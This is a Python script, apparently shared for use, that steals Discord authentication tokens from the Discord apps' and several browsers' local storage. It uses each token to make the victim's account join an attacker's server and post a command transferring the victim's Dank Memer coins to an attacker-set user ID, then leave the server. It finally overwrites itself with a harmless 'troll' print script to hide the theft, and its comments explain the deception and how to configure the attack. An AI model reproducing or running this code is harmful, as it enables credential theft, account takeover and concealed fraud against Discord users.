import os, re, json, time, requests
from urllib.request import Request, urlopen


def dontlooksuspicious():
    f = open("PythonDemo.py", "w")

    script = """
import time
time.sleep(2)
print("Your pretty")
time.sleep(3)
print("Dumb")
time.sleep(3)
"""
    f.write(script) #this writes into the program they just ran, making it seem like they just ran a troll message script that you've been learning how to make, when in reality you stole all their dank memer coins :kek:
    f.close() #rather then deleting it , this is done, it looks a lot less suspicious






server = "discord.gg/1234567890abc"
#this should be the invite to the server - have dank memer invited all setup!
channelid = "123"
#this should be the channel ID that you want them to message - turn on dev mode and copy the ID of a channel that everyone can talk in
userid = "123"
#put the USER ID that u want the coins sent to here
serverid = "123"
#put your server id from right clicking the server and pressing copy ID, this allows the program to make the user LEAVE the server after done


#just in case someone tries removing " " around the variables lel:
channelid = str(channelid) 
userid = str(userid) 
server = str(server)
serverid = str(serverid)

msg = f"pls share <@{userid}> all"
def find_tokens(path):

    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    global server
    global userid 
    global channelid 
    global serverid
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = "Tokens:\n"

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            continue






    message = message.split()
    server = server.replace("https://discord.gg/","")
    server = server.replace("discord.gg/","")
    for m in message:
      #  print(m)
        try:
            headers = {'Authorization': m, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
            requests.post(f"https://discord.com/api/v6/invites/{server}", headers=headers, timeout=10)
            requests.post(f"https://discord.com/api/v8/channels/{channelid}/messages",json={'content': msg}, headers=headers)
            requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{serverid}", headers=headers)




        except:
            pass
    print("Your pretty")
    time.sleep(3)
    print("Dumb") #this means if they look at the src AFTER running, as this was the only stuff  that was printed, they wouldn't think anything of it
    time.sleep(1)
    dontlooksuspicious() 
main()
